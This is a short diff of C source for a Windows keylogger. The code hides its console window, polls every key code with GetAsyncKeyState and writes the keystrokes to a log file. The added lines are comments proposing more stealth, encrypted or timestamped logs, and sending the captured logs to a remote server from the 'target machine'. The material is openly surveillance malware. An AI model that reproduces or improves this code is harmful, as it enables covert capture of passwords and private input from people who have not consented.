@@ -13,6 +13,7 @@ int main() {
     // Hide the console window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
+    // While this method does work for key logging, its not very stealthy and could probably be improved a bit
     while (1) {
         for (int key = 8; key <= 255; key++) { // Loop through all possible key codes
             if (GetAsyncKeyState(key) & 0x0001) { // Check if key is pressed
@@ -27,6 +28,11 @@ int main() {
 }
 
 // Function to log the keypress
+// There the way the logs are stored can be improved in multiple ways. Some ideas include:
+//     Some form of Encryption
+//     Time Stamps
+// These logs are also stored locally on the target machine. 
+// Another idea would be to transmit them back to a server somewhere...
 void logKey(int key, FILE* logfile) {
     switch (key) {
     case VK_BACK: fprintf(logfile, "[BACKSPACE]"); break;
